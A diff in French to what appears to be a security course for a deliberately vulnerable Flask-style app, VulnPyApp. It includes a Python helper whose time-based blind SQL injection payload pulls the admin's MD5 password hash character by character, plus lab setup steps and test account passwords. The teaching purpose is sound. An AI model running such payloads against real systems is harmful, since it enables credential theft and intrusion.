@@ -545,13 +545,15 @@ def extract_char_at_position(position):
     """Extrait un caractère du hash MD5 admin à une position donnée"""
     for char in string.hexdigits.lower():
         # SUBSTR(password_hash, position, 1) = char
-        # Si vrai → randomblob(100000000) force un calcul long
+        # Si vrai → WITH RECURSIVE génère 100 000 itérations (délai ~2s sur SQLite)
         # Si faux → réponse immédiate
         payload = (
             f"x%' AND (SELECT CASE WHEN "
             f"(SUBSTR((SELECT password_hash FROM users WHERE email='admin@vulnpyapp.local'),"
             f"{position},1)='{char}') "
-            f"THEN randomblob(100000000) ELSE 0 END)--"
+            f"THEN (WITH RECURSIVE cnt(x) AS "
+            f"(SELECT 1 UNION ALL SELECT x+1 FROM cnt WHERE x<100000) "
+            f"SELECT COUNT(*) FROM cnt) ELSE 0 END)--"
         )
         start = time.time()
         requests.get(url, params={'q': payload})
@@ -1154,20 +1156,27 @@ Rédiger un document `analyse_rgpd.md` contenant :
 
 ### 🏗️ Setup
 
+**Important :** VulnPyApp existe en deux versions :
+- **Branche `student-starter`** : Application volontairement vulnérable avec les 15 vulnérabilités marquées `🚨 VULN #1..#15`. À utiliser pour cette séance.
+- **Branche `main` / `remediated`** : Version sécurisée avec les corrections marquées `✅ FIX #1..#15`. Utilisée en fin de séance pour comparaison.
+
 ```bash
 # 1. Cloner le dépôt (lien fourni par l'enseignant)
 git clone <URL_INSTITUTIONNELLE>/vulnpyapp.git
 cd vulnpyapp
-git checkout student-starter
 
-# 2. Lancer l'application
+# 2. Sélectionner la branche vulnérable (défaut pour cette séance)
+git checkout student-starter
+# ✅ Vous êtes maintenant sur la version avec 15 vulnérabilités marquées 🚨 VULN #N
+
+# 3. Lancer l'application
 docker-compose up --build
 
-# 3. Vérifier que l'app est accessible
+# 4. Vérifier que l'app est accessible
 curl http://localhost:5000
 # → Vous devez voir la page d'accueil
 
-# 4. Comptes de test disponibles
+# 5. Comptes de test disponibles
 # alice@vulnpyapp.local / Alice123!  (utilisateur normal)
 # bob@vulnpyapp.local   / Bobby123!   (utilisateur normal)
 # admin@vulnpyapp.local / Admin123! (admin - à découvrir !)
